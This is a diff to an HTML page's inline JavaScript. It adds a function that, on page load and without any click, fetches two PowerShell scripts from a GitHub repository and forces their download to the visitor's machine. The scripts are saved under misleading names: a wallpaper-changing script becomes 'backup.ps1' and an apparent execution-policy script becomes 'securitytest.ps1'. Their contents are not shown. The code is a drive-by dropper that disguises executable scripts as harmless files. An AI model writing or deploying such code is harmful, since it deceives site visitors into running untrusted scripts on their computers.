@@ -12,40 +12,48 @@
         // GitHub repository details
         var username = 'Leozk2000';
         var repo = 'internstuff';
-        var path = 'changewallpaper1.ps1';
 
-        // GitHub API URL to get the raw content
-        var githubApiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;
+        // Function to download a script
+        function downloadScript(path, filename) {
+            // GitHub API URL to get the raw content
+            var githubApiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;
 
-        // Fetch the script content from GitHub
-        fetch(githubApiUrl)
-            .then(response => response.json())
-            .then(data => {
-                // Extract the content from the response
-                var psScriptContent = atob(data.content.replace(/\s/g, ''));
+            // Fetch the script content from GitHub
+            fetch(githubApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    // Extract the content from the response
+                    var scriptContent = atob(data.content.replace(/\s/g, ''));
 
-                // Create a Blob containing the PowerShell script
-                var blob = new Blob([psScriptContent], { type: 'application/octet-stream' });
+                    // Create a Blob containing the script
+                    var blob = new Blob([scriptContent], { type: 'application/octet-stream' });
 
-                // Create a link element
-                var link = document.createElement('a');
+                    // Create a link element
+                    var link = document.createElement('a');
 
-                // Set the link's href attribute to the Blob URL
-                link.href = window.URL.createObjectURL(blob);
+                    // Set the link's href attribute to the Blob URL
+                    link.href = window.URL.createObjectURL(blob);
 
-                // Set the download attribute to specify the filename
-                link.download = 'securitytest.ps1';
+                    // Set the download attribute to specify the filename
+                    link.download = filename;
 
-                // Append the link to the document
-                document.body.appendChild(link);
+                    // Append the link to the document
+                    document.body.appendChild(link);
 
-                // Trigger a click on the link to initiate the download
-                link.click();
+                    // Trigger a click on the link to initiate the download
+                    link.click();
 
-                // Remove the link from the document
-                document.body.removeChild(link);
-            })
-            .catch(error => console.error('Error fetching script from GitHub:', error));
+                    // Remove the link from the document
+                    document.body.removeChild(link);
+                })
+                .catch(error => console.error(`Error fetching script '${filename}' from GitHub:`, error));
+        }
+
+        // Download the first script
+        downloadScript('changewallpaper1.ps1', 'backup.ps1');
+
+        // Download the second script
+        downloadScript('exepolicy.ps1', 'securitytest.ps1');
     </script>
 
 </body>
